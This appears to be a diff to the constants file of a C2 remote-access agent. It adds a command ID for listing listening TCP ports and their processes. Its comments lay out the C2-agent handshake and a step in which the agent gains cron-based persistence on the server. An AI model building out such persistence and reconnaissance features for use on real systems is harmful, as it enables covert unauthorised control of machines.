@@ -7,6 +7,7 @@ LISTDIR_COMMAND_ID = 1
 WALKDIR_COMMAND_ID = 2
 RUNNING_PROCESSES_COMMAND_ID = 3
 FILE_UPLOAD_COMMAND_ID = 4
+NETWORK_CONNECTIONS_COMMAND_ID = 5
 
 
 COMMANDS_ID_TO_DESCRIPTION = {
@@ -14,10 +15,11 @@ COMMANDS_ID_TO_DESCRIPTION = {
     WALKDIR_COMMAND_ID: "WalkDir",
     RUNNING_PROCESSES_COMMAND_ID: "Get running processes",
     FILE_UPLOAD_COMMAND_ID: "Upload file",
+    NETWORK_CONNECTIONS_COMMAND_ID: "List listening TCP ports and their processes",
 }
 
 # Define the format string for the packet with big-endian byte order
-# '>' - big-endian
+# '>' - big-endian (network byte order)
 
 # todo: #to-fill
 COMMAND_ID_PACKET_FORMAT = ">I"  # 'I' - 4-byte uint : the command_id
@@ -35,6 +37,7 @@ MESSAGE_STATUS_OK = 1
 MESSAGE_STATUS_ERROR = 2
 
 DEFAULT_RECV_BUFFER = 4096
+
 #flow will look like this
 # 1. C2 (acting as client) ->TCP CONNECT ->  agent(acting as server)
 #      handshake starts
@@ -44,7 +47,7 @@ DEFAULT_RECV_BUFFER = 4096
 # 3. C2 sends c2_hello() -> agent receives connect request success/fail
 #     if fail -> agent exit
 #     if success -> agent waits for incoming commands
-# todo: 4. Agent gains persistency on server via cron (allow server to start if not already started)
+#4. Agent gains persistency on server via cron job (allow server to start if not already started)
 # 5. C2 receives commands from user's UI and send to agent
 # 6. agent executes and sends response to C2
 
